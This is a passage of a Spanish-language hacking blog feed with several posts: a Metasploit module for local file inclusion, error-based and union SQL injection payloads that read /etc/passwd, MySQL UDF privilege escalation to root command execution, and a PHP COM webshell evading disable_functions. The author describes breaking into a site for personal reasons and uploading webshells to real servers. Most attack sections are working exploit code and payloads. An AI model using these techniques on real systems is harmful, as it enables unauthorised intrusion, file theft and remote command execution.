</span><span class='line'>        <span class="n">host</span><span class="o">=</span><span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">data</span> <span class="o">=~</span> <span class="sr">/root:/</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Parametro vulnerable a LFI -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Not Found -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">lfi</span><span class="p">(</span><span class="n">web</span><span class="p">,</span> <span class="n">pb</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">a</span><span class="o">=</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">while</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">pb</span>
</span><span class='line'>            <span class="n">a</span><span class="o">=</span><span class="n">a</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">traversal</span><span class="o">=</span><span class="s2">&quot;../&quot;</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">file</span>
</span><span class='line'>            <span class="n">vector</span><span class="o">=</span><span class="n">web</span><span class="o">+</span><span class="n">traversal</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">data</span><span class="o">=</span><span class="n">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">lfi</span><span class="p">(</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="p">,</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;etc/passwd&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">lfi</span><span class="p">(</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="p">,</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;etc/passwd%00&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Para terminar agregaremos el auxiliar a msf, crearemos un direcotorio en /opt/metasploit/apps/pro/msf3/modules/auxiliary y copiaremos nuestro script dentro.</p>

<p>Luego accederemos a el.</p>

<p><img src="http://i.imgur.com/0ueSEgq.png"></p>

<p><img src="http://i.imgur.com/qL8scnG.png"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[MYSQLI EB con extractvalue()]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/23/mysqli-eb-con-extractvalue/"/>
    <updated>2014-11-23T03:06:05+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/23/mysqli-eb-con-extractvalue</id>
    <content type="html"><![CDATA[<p>Quien conozca de inyecciones sabe bien que para explotar una mysqli error based  es necesario utitlizar las funciones floor() y rand() .</p>

<p><img src="http://i.imgur.com/SjsNAze.png?1"></p>

<!--more-->


<p>Pero hay otra manera que se basa en aprovechar otro tipo de error, incluso es mucho mas sencilla de interpretar ademas de ser un vector corto y eficaz.</p>

<p>Leyendo el blog de Dmitry Evteev en una entrada que habia publicado en el 2009 (bastante viejita ya), encontre una forma de explotar un error based de una manera que llamo poderosamente mi atencion.</p>

<p>La funcion extractvalue() sirve para extraer valores de un elemento XML, por ejemplo tenemos la siguiente cadena:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;b&gt;</span>q3rv0<span class="nt">&lt;/b&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Si quieramos extraer la palabra q3rv0 lo realizariamos de la siguiente manera.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;q3rv0&lt;/b&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;/b&#39;</span><span class="p">);</span>
</span><span class='line'><span class="o">+------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;q3rv0&lt;/b&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;/b&#39;</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">q3rv0</span>                              <span class="o">|</span>
</span><span class='line'><span class="o">+------------------------------------+</span>
</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>La manera de aprovechar esta funcion para que nos devuelva informacion es obligarla a realizar un error de sintaxis.</p>

<p>Que pasa si introducimos la funcion user() en el argumento que es utilizado para extraer ciertos valores.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;q3rv0&lt;/b&gt;&#39;</span><span class="p">,</span> <span class="nf">user</span><span class="p">());</span>
</span><span class='line'><span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;@localhost&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Como vemos nos arroja el error, ademas del usuarios en la db.</p>

<p>El problema es que lo muestra entrecortado, para eso vamos a concatenar la salida.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;q3rv0&lt;/b&gt;&#39;</span><span class="p">,</span> <span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span> <span class="nf">user</span><span class="p">()));</span>
</span><span class='line'><span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;~root@localhost&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Como podemos llevarla acabo mediante una inyeccion?</p>

<p>De la siguiente manera.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://www.webvuln.com/negocio.php?id=60 union select extractvalue(1, concat(0x7e, version()))–</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/4eEgNDG.png?1"></p>

<p>Referencia: <a href="http://devteev.blogspot.com.ar">http://devteev.blogspot.com.ar</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFI+SQLI [Incluyendo ficheros a travez de valores enteros]]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros/"/>
    <updated>2014-11-23T02:15:42+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros</id>
    <content type="html"><![CDATA[<p>No es necesario que un parametro trabaje con valores tipo “string” para incluir ficheros localmente, hay ciertos parametros que trabajan con funciones como include(), require(), <!--more-->etc pero lo hacen por medio de un valor entero,por ejemplo:</p>

<p>Tenemos la siguiente url:</p>

<p><a href="http://www.webvuln.com/path/index.php?op=11">http://www.webvuln.com/path/index.php?op=11</a></p>

<p>La cual se encarga de mostrar cierto contenido dependiendo del valor que sea ingresado en el “id”.En este caso el script realiza una sentencia en la base de datos para obtener el nombre del fichero, el cual luego sera pasado a include().</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$query</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conexion</span><span class="p">,</span> <span class="s2">&quot;SELECT path FROM archivos WHERE id=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$fichero</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nx">MYSQLI_ASSOC</span><span class="p">);</span>
</span><span class='line'><span class="k">include</span><span class="p">(</span><span class="nv">$fichero</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ahora vamos a un caso real.</p>

<p>La vulnerabilidad se da del lado del admin, al ingresar una comilla simple vemos el siguiente error.</p>

<p><img src="http://i.imgur.com/tKimFbT.png?2"></p>

<p>El problema es que no podemos realizar un path traversal directamente por lo que se explicaba en lineas anteriores, pero si podriamos comprobar si el mismo parametro es vulnerable a inyeccion de comandos SQL.</p>

<p><img src="http://i.imgur.com/PnFMDtY.png?1"></p>

<p>Definitivamente si, y nos arroja la columna 3 la cual hace referencia a la seleccion de la ruta del archivo.</p>

<p>Entonces podriamos probar a inyecctar una sentencia para poder divisar cualquier fichero (siempre dentro de los limites) a nuestro antojo.</p>

<p>Veamos el fichero /etc/passwd.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://www.webvuln.com/path/index.php?op=11 union select 1,2,0x2f6574632f706173737764,4,5–</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/UCnFB83.png?1"></p>

<p>Como dije anteriormente este parametro vulnerable se encuentra detras del panel de administracion, pero hay muchas veces en las que la reglas de un upload no pueden ser evadidas y hay que buscar otra manera de subir una shell, tranquilamente se podria explotar mediante una jpg file inclusion y proseguir con la intrusion.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mysql UDF injection [Elevacion de privilegios]]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/23/mysql-udf-injection-elevacion-de-privilegios/"/>
    <updated>2014-11-23T01:28:36+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/23/mysql-udf-injection-elevacion-de-privilegios</id>
    <content type="html"><![CDATA[<p>Una linda manera de elevar privilegios en un sistema comprometido es aprovechando los permisos con los que corren ciertos demonios en el sistema como el servidor mysql.
Hay dos formas de añadir funciones a Mysql y una de ellas es a travez de la interface UDF (funciones definidas por el usuario) para esto habra que contar con la libreria necesaria apartir de la cual seran llamadas. Teniendo los privilegios necesarios podremos crear ciertas funciones como sys_eval() la cual nos permitiran ejecutar comandos como usuario root desde la propia db.</p>

<!--more-->


<p>Ante todo debemos asegurarnos de que la base de datos corre con superprivilegios, miremos el fichero de configuracion en /etc/mysql/my.cnf</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># * Basic Settings
</span><span class='line'>#
</span><span class='line'>user            = root
</span><span class='line'>pid-file        = /var/run/mysqld/mysqld.pid
</span><span class='line'>socket          = /var/run/mysqld/mysqld.sock
</span><span class='line'>port            = 3306
</span><span class='line'>basedir         = /usr
</span><span class='line'>datadir         = /var/lib/mysql
</span><span class='line'>tmpdir          = /tmp
</span><span class='line'>language        = /usr/share/mysql/english</span></code></pre></td></tr></table></div></figure>


<p>Descargamos la libreria lib_mysqludf_sys.so dentro del directorio /tmp</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>wget https://github.com/mysqludf/lib_mysqludf_sys/raw/master/lib_mysqludf_sys.so
</span></code></pre></td></tr></table></div></figure>


<p>Conectamos con las credenciales obtenidas a la base de datos</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -u <span class="s2">&quot;user&quot;</span> -p<span class="s2">&quot;password&quot;</span> database
</span></code></pre></td></tr></table></div></figure>


<p>Creamos la table code</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nf">code</span> <span class="p">(</span><span class="n">codigo</span> <span class="kt">blob</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Presten atencion al tipo de campo “blob” este sirve para almacenar datos binarios entre otros, esto hara que al momento de volcar el fichero no se produzca un cambio de ciertos caracteres que puedan llegar a generar un error cuando la libreria sea llamada.</p>

<p>Insertaremos la libreria en la tabla code</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">code</span> <span class="k">VALUES</span><span class="p">(</span><span class="nf">load_file</span><span class="p">(</span><span class="s1">&#39;/tmp/lib_mysqludf_sys.so&#39;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>Dumpeamos los datos en /usr/lib/mysql/plugin/ que es el directorio desde donde el servidor cargara las librerias.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">code</span> <span class="k">INTO</span> <span class="n">DUMPFILE</span> <span class="s1">&#39;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Por ultimo creamos la funcion sys_eval()</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">CREATE</span> <span class="n">FUNCTION</span> <span class="n">sys_eval</span> <span class="n">RETURNS</span> <span class="n">string</span> <span class="k">SONAME</span> <span class="s1">&#39;lib_mysqludf_sys.so&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Llamamos a  dicha funcion</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">select</span> <span class="nf">sys_eval</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
</span><span class='line'><span class="o">+-----------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="nf">sys_eval</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>                          <span class="o">|</span>
</span><span class='line'><span class="o">+-----------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
</span><span class='line'><span class="o">|</span>
</span><span class='line'><span class="o">+-----------------------------------------+</span>
</span></code></pre></td></tr></table></div></figure>


<p>Les dejo un video demostrativo que realize en un entorno controlado</p>

<div class="embed-video-container"><iframe src="//www.youtube.com/embed/uaadERGHstk" allowfullscreen></iframe></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Windows OS] Evadiendo las disable_functions en php con COM()]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/23/windows-os-evadiendo-las-disable-functions-en-php-con-com/"/>
    <updated>2014-11-23T01:17:59+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/23/windows-os-evadiendo-las-disable-functions-en-php-con-com</id>
    <content type="html"><![CDATA[<p>Escribo este mini post, para hablar sobre el tema de evacion de ejecucion de comandos en servidores Windows, es que hace poquito subi una webshell a un Windows NT, y me encontre con las siguientes funciones denegadas:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-system
</span><span class='line'>-shell
</span><span class='line'>-exec
</span><span class='line'>-system_exec
</span><span class='line'>-shell_exec
</span><span class='line'>-mysql_pconnect
</span><span class='line'>-passthru
</span><span class='line'>-popen
</span><span class='line'>-proc_open
</span><span class='line'>-proc_close
</span><span class='line'>-proc_nice
</span><span class='line'>-proc_terminate
</span><span class='line'>-proc_get_status
</span><span class='line'>-escapeshellarg
</span><span class='line'>-escapeshellcmd
</span><span class='line'>-eval</span></code></pre></td></tr></table></div></figure>




<!--more-->


<p><img src="http://i.imgur.com/o0CK2.png?1"></p>

<p>Ademas recorde que el usuario Abnormality tenia el mismo problema asi que por que no aclararlas en este escrito, ademas de hablar un poco sobre las maneras que pueden haber para saltearnos esta restriccion que el administrador impuso dentro del php.ini, en mi caso me tope con un server que corre dos tecnologias web como lo son PHP y ASP, otras cosas a tener en cuenta pegandole una ojeada a la imagen son las siguientes:</p>

<p>-Base de datos MSSQL corriendo en local.</p>

<p>-Lenguaje Perl activo</p>

<p>-ASP</p>

<p>-De ahora en mas ya tenemos dos maneras posibles de ejecutar comnados en el servidor, una es utlizando alguna webshell en perl, como por ejemplo la tan conocida “CGI telnet”, pero ademas de incluir un .htaccess que nos agregue la extencion .pl dentro del modulo del servidor, vamos a tener que modificar la ruta #!/usr/bin/perl por el path en el que se encuentra instalado perl, por defecto esta es #!C:\Program Files\perl\perl.exe pero podria estar instalado en otra hubicacion, para eso podriamos buscar la existencia de algun perlinfo.cgi el cual es un fichero que guarda informacion de perl similar a info.php, hay podriamos buscar el path del mismo.</p>

<p>– Otra manera seria ingresando a la base de datos MSSQL con privilegios de SA y ejecutar comandos mediante la funcion XP_CMDSHELL, esto lo podriamos hacer indagando en los scripts *.asp (formularios de autentificacion) de los demas dominios que conviven en el servidor, ya que no se me impedia moverme libremente por el mismo y leer ficheros dentro de lo que son los directorios web. Obviamente se debe a una mala configuracion de los permisos.</p>

<p>– Tambien podemos subir un shell en ASP.</p>

<p><img src="http://i.imgur.com/HGnsZ.png?1"></p>

<p>Y por ultimo llegamos al uso de COM en php,</p>

<p>Basicamente y sin dar muchas vueltas COM permite interactuar con las aplicaciones de windows,  fue desarrlollado para trabjar con POO (programacion orientada a objetos) y esta compuesto por objetos como WScript.Shell el cual permite interactuar con programas como el regedit, acceso a los directorios del sistema, entre otras tareas.</p>

<p>De esta manera investigando a pleno me encuentro con el siguiente script programado por hadi-kiamarsi en php:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hk&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hk&#39;</span><span class="p">]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$nuevo</span><span class="o">=</span><span class="k">new</span> <span class="nx">COM</span><span class="p">(</span><span class="s1">&#39;WScript.Shell&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Unable to Load Activex&#39;</span><span class="p">);</span> <span class="c1">//se crea el objeto WScript.Shell</span>
</span><span class='line'>    <span class="nv">$salida</span><span class="o">=</span><span class="nv">$nuevo</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hk&#39;</span><span class="p">]);</span> <span class="c1">//variable de entrada para ejecucion de comandos a travez de WScript mediante exec()</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">echo</span> <span class="nv">$salida</span><span class="o">-&gt;</span><span class="na">stdout</span><span class="o">-&gt;</span><span class="na">readall</span><span class="p">;</span> <span class="c1">// obtencion de datos mediante stdout-&gt;readall</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>El cual me premitio cumplir con mi objetivo en el servidor, lo comente un poco para que se entienda aunque es bastante sencillo e intuitivo.</p>

<p><img src="http://i.imgur.com/csTNy.png?1"></p>

<p>Saludos y espero que hayan aprendido algo nuevo, por mi parte me alegro de cada dia aparezcan nuevos desafios para seguir dandole para adelante con el conocimiento y la curiosidad!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Blind Mysqli Time Based [Teoria]]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/blind-mysqli-time-based-teoria/"/>
    <updated>2014-11-17T10:42:51+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/blind-mysqli-time-based-teoria</id>
    <content type="html"><![CDATA[<p>Mientras “auditaba” una web, lo digo entre comillas por que no me dedico a eso en lo laboral, mas bien me encontraba tratando de ingresar a un sitio por cuestiones personales, me encontre con una variante de inyeccion sql dando por descartado las demas a travez de las respuestas que generaba el servidor, una “Blind mysqli basada en tiempo”,<!--more--> paso a explicar a quienes no se encuntren familiarizados con este tipo de inyeccion.
Basicamente una “Blind mysqli basada en tiempo” se trata de inyectar a ciegas como toda blind, en mi caso utilizando la tecnica de busqueda binaria (la mas comunmente utilizada en estas situaciones) pero se da cuando la aplicacion muestra el mismo mensaje TRUE OR FALSE, es decir que da los mismo inyectar un OR 1=1 que un OR 2+5/87=9999999999 el sitio web nos seguira mostrando el mismo mensaje de error, o puede deberse a realizar una carga incorrecta del contenido web, o cualquier otra desvariacion en el sitio, da lo mismo la aplicacion resulta vulnerable pero no podremos deducir cual es la inyeccion correcta.
Para estas situaciones, podemos hacer uso de la funcion sleep() y la estructura condicional if(), ahora paso a explicar la sintaxis de cada una de estas.</p>

<p>La sintaxis de if es la siguiente:</p>

<p>if(&ldquo;condicion&rdquo;,&ldquo;si la condicion se cumple&rdquo;,&ldquo;si la condicion no se cumple&rdquo;)</p>

<p>Por ejemplo:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="s1">&#39;Falso no es igual!&#39;</span><span class="p">);</span>
</span><span class='line'><span class="o">+------------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="s1">&#39;Falso no es igual!&#39;</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+------------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">Verdadero</span> <span class="n">es</span> <span class="n">igual</span><span class="o">!</span>                                  <span class="o">|</span>
</span><span class='line'><span class="o">+------------------------------------------------------+</span>
</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>sleep() se utiliza para producir una pausa de tantos segundos, vamos a combinarlo con if() e imponerlo si la condicion no se cumple.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="s1">&#39;q3rv0&#39;</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span>
</span><span class='line'><span class="o">+------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="s1">&#39;q3rv0&#39;</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> <span class="o">|</span>
</span><span class='line'><span class="o">+------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="mi">0</span>                                              <span class="o">|</span>
</span><span class='line'><span class="o">+------------------------------------------------+</span>
